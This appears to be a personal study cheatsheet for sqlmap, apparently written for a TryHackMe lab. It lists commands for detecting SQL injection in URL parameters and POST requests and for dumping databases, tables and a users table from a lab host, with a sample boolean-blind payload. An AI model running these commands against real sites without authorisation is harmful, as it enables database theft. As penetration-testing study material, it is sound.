## Cheatsheet for sqlmap
* used to automate sql injection

```bash
#Run interactive program
sqlmap --wizard
```

### Flags
```bash
#Extract databases
--dbs

#Extract table inside database
-D $database_name -T $table --dump

#Make sqlmap do deep search
--level=5
```

### URL injection
* somtime web applications pass arguments in the url
```bash
#Example
http://sqlmaptesting.thm/search/cat=1
```
* we can use this to test for sql injection
```
sqlmap -u http://sqlmaptesting.thm/search/cat=1
```
* positive output would look like this
```
Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
```
* this means the web-app is vulnerable to sql-injectio
* lets use this to extract info
```bash
#Extract databases names
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
#Extract tables from database named users
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
#Extract table contents from table named thomas
sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
```

### Post request injection
1. intercept post request(using burp)
2. save to a file
3. use sqlmap
```bash
sqlmap -r $File
```